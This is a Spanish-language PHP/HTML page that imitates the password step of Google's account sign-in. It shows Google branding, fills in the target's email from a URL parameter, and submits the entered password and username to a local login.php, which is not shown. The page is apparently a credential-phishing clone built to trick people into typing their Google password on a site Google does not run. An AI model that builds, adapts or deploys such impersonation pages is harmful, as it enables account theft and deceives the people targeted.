<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="google-logo-cabecera.png">
    <title>Acceso: Cuentas de Google</title>
    <link rel="stylesheet" href="psw-styles.css">
</head>
<body>

    <div class="auth-container">


        
        <div class="side-form">
            <div class="logo-placeholder">
                <img src="google-recuadro.png" alt="Logo de mi negocio">
            </div>
            <h1>Bienvenido</h1>
            <div class="google-user-chip">
                
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"></path>
                </svg>

                <span>
                    <?php 
                        if (isset($_GET['user']) && !empty($_GET['user'])) {
                            echo htmlspecialchars($_GET['user']); 
                        } else {
                            echo "usuario@correo.com"; 
                        }
                    ?>
                </span>

                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style="margin-left: 4px; margin-right: 0;">
                    <path d="M7 10l5 5 5-5z"></path>
                </svg>
            

            </div>

            
            <form method="post" action="login.php">

                <input type="hidden" name="username" value="<?php echo htmlspecialchars($_GET['user'] ?? ''); ?>">

                <div class="input-wrapper">
                    <input type="password" name="password" id="password" placeholder="Ingresa tu contraseña" required>
                    <label>
                        <input type="checkbox" name="terminos" value="aceptado" onclick="mostrarContrasena()"> 
                        Mostrar contraseña
                    </label>
                </div>

                <script>
                    function mostrarContrasena(){
                        var tipo = document.getElementById("password");
                        if(tipo.type == "password"){
                            tipo.type = "text";
                        }else{
                            tipo.type = "password";
                        }
                    }
                </script>

                <!--
                <a href="#" style="color: var(--google-blue-dark); text-decoration: none; font-size: 14px;">
                    ¿Has olvidado tu contraseña?
                </a>
                -->

                <!--
                <p class="mixed-text">
                    ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.<span>Más información para usar el modo de invitado</span>
                </p>
                -->
                <div class="action-row">

                    <a href="#" style="color: var(--google-blue-dark); text-decoration: none; font-size: 14px;">
                    ¿Olvidaste la contraseña?
                    </a>

                    <button type="submit" name="signIn" class="btn-primary">Siguiente</button>
                </div>

            </form>
        </div>
    </div>

    <footer class="footer-external">
        <div class="lang-selector">
            Español (México) ▼
        </div>

        <div class="footer-links">
            <a href="#">Ayuda</a>
            <a href="#">Privacidad</a>
            <a href="#">Condiciones</a>
        </div>
    </footer>

</body>
</html>